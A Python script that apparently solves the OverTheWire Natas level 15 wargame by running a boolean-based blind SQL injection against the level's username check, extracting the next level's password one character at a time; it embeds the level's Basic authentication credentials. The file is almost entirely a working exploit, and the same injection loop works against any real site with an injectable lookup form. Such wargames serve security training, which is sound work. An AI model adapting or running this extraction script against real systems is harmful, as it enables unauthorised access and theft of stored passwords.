import requests
import string


URL = 'http://natas15.natas.labs.overthewire.org/'
HEADERS = {'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='}
LETTERS = string.ascii_letters + string.digits

"""
    tou should replace the value of the header with your own credentials if natas passwords changes by the time you are seeing this
    to get the correct value just login to the level and go to inspect/network then refresh the page and find Authorization header in request
"""

password = ''

while len(password) != 32:
    for i in LETTERS:
        tmp_password = password + i
        data = {'username': f'natas16" AND password LIKE BINARY "{tmp_password}%"; #'}
        print(data)
        while True:
            try:
                result = requests.post(url=URL, data=data, headers=HEADERS)
                break
            except ConnectionResetError:
                print('connection Error Trying Again')
            except requests.exceptions.ConnectionError:
                print('connection Error Trying Again')
        if 'This user exists' in result.content.decode():
            password += i
            print('password starts with ', password)
            break



print('the password is :', password)
